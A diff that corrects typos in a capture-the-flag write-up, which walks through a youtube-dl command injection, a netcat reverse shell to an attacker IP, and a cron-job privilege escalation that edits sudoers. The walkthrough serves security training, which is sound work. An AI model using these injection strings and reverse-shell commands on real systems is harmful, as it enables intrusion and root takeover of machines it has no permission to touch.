@@ -134,7 +134,7 @@ Content-Type: text/html; charset=UTF-8
 {"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";id;","output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","result_url":"\/tmp\/downloads\/5fb93815ed122.mp3"}
 ```
 
-Bingo! The response return `"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"`, thereby it's vulnerable to command injection.
+Bingo! The response returned `"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"`, thereby it's vulnerable to command injection.
 
 ## Remote Code Execution (RCE)
 
@@ -145,13 +145,13 @@ We can now try to execute a reverse shell. There are several ways to do that, in
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_IP> 4444 >/tmp/f
 ```
 
-Now we have to upload the fileto the remote machine. In order to do such thing, we can simply run a Python server and downloa the file from the remote machine, exploiting the command injection:
+Now we have to upload the file to the remote machine. In order to do such thing, we can simply run a Python server and download the file from the remote machine:
 
 ```sh
 attacker@machine:~$ python3 -m http.server 4343
 ```
 
-And then, just posting the following HTTP request with Burp Repeater, which will "wget" our `rev_shell.sh` script:
+And then we can exploit the command injection by just posting the following HTTP request with Burp Repeater, which will "wget" our `rev_shell.sh` script:
 
 ```
 POST / HTTP/1.1
@@ -213,7 +213,7 @@ yt_url=;bash${IFS}rev_shell.sh;
 
 Voilà! We now have a remote shell. Let's switch to a more comfortable shell by typing `/bin/bash -i`.
 
-Now we can retrieve the user to access the secret folder by viewing `/***secret_folder***/.htpasswd`:
+At this point, we can retrieve the user that is allowed to access the secret folder by viewing `/***secret_folder***/.htpasswd`:
 
 ```sh
 www-data@dmv:/var/www/html$ cat ***secret_folder***/.htpasswd
@@ -229,14 +229,14 @@ www-data@dmv:/var/www/html$ cat ***secret_folder***/flag.txt
 
 ## Privilege Escalation
 
-In order to get the root flag we have to elevate our privileges. If we go back to the directories enumeration step, we found also the `/tmp`. By looking inside it, we can discover a script called `clean.sh`:
+In order to get the root flag we have to elevate our privileges. If we go back to the directories enumeration step, we had found the `/tmp`. By looking inside it, we can discover a script called `clean.sh`:
 
 ```sh
 www-data@dmv:/var/www/html$ cat tmp/clean.sh
 rm -rf downloads
 ```
 
-It could be a cron job, as the aim of the script would sugget. We can investigate about it by using [pspy](https://github.com/DominicBreuker/pspy). So let's upload it to the remote machine and execute it:
+It could be a cron job, as the aim of the script would suggest. We can investigate about it by using [pspy](https://github.com/DominicBreuker/pspy). So let's upload it to the remote machine and execute it:
 
 ```sh
 www-data@dmv:/var/www/html$ ./pspy64s
@@ -248,13 +248,13 @@ www-data@dmv:/var/www/html$ ./pspy64s
 2020/11/21 17:32:01 CMD: UID=0    PID=1389   | /usr/sbin/CRON -f 
 ```
 
-Yeah! Here is the proof that we have a misconfigured cron job as the `clean.sh` script is scheduled to run regularly as *root* (UID=0), but `www-data` (our current user) is the owner. Thereby we can modify this script and elevate our privileges as follows:
+Yeah! Here is the proof that we have a misconfigured cron job, as the `clean.sh` script is scheduled to run regularly as *root* (UID=0), but `www-data` (our current user) is the owner. Thereby we can modify this script and elevate our privileges as follows:
 
 ```sh
 www-data@dmv:/var/www/html$ echo "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" > clean.sh
 ```
 
-Now all we have to do is to wait for the next execution of the script and... voilà! Our user has finally **root permissions**:
+Eventually, all we have to do is to wait for the next execution of the script and... voilà! Our user finally got **root permissions**:
 
 ```sh
 www-data@dmv:/var/www/html$ sudo ls /root
